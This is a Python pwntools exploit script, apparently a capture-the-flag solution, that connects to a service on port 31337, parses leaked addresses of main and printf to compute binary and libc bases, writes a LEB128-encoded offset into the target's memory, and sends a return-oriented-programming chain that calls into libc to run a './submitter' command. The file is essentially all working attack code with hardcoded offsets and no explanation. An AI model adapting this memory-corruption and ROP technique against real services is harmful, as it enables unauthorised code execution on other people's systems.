#!/usr/bin/python3

from pwn import *
import typing
# from ctypes import CDLL


class leb128:
    @staticmethod
    def encode(i: int) -> bytearray:
        """Encode the int i using unsigned leb128 and return the encoded bytearray."""
        assert i >= 0
        r = []
        while True:
            byte = i & 0x7f
            i = i >> 7
            if i == 0:
                r.append(byte)
                return bytearray(r)
            r.append(0x80 | byte)

    @staticmethod
    def decode(b: bytearray) -> int:
        """Decode the unsigned leb128 encoded bytearray."""
        r = 0
        for i, e in enumerate(b):
            r = r + ((e & 0x7f) << (i * 7))
        return r

    @staticmethod
    def decode_reader(r: typing.BinaryIO) -> typing.Tuple[int, int]:
        """
        Decode the unsigned leb128 encoded from a reader, it will return two values, the actual number and the number
        of bytes read.
        """
        a = bytearray()
        while True:
            b = r.read(1)
            if len(b) != 1:
                raise EOFError
            b = ord(b)
            a.append(b)
            if (b & 0x80) == 0:
                break
        return leb128.decode(a), len(a)


def connect():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337
    r = remote(HOST, int(PORT))

    return r


def main(offset=0):
    p = connect()

    p.recvline()
    main = int(p.recvline().split(b": ")[-1], 16)
    var = int(p.recvline().split(b": ")[-1], 16)
    printf = int(p.recvline().split(b": ")[-1], 16)
    address = main - 5358
    libc_address = printf - 393472

    # for i in range(0, 0x2d4-0xb8, 8):
    #     p.sendline(hex(address + 0x20b8 + i).encode())
    #     p.sendline(b"0xdeadbeefcafebabe")
    #     p.sendline(b"1")

    p.sendline(hex(address + 0x20b8 + 455).encode())

    one_ = libc_address + 553088
    offset = one_ - (address + 0x12e0)
    target_bytes = leb128.encode(offset).ljust(
        8, b"\x00")  # + b"\x00\x89\x04\x05\x00\x00"

    p.sendline(hex(u64(target_bytes)).encode())
    p.send(b"0")

    payload = p64(address + 0x101a)*20
    payload += p64(libc_address + 0x10f75b)
    payload += p64(libc_address + 1881135)
    payload += p64(libc_address + 362320)
    p.sendline(payload)
    p.sendline(b"./submitter")
    print(p.recvall(timeout=3))


if __name__ == "__main__":
    # context.log_level = "CRITICAL"
    # for i in range(0, 0x2d4-0xb8, 4):
    # for i in range(112, 0x2d4-0xb8, 8):
    main()
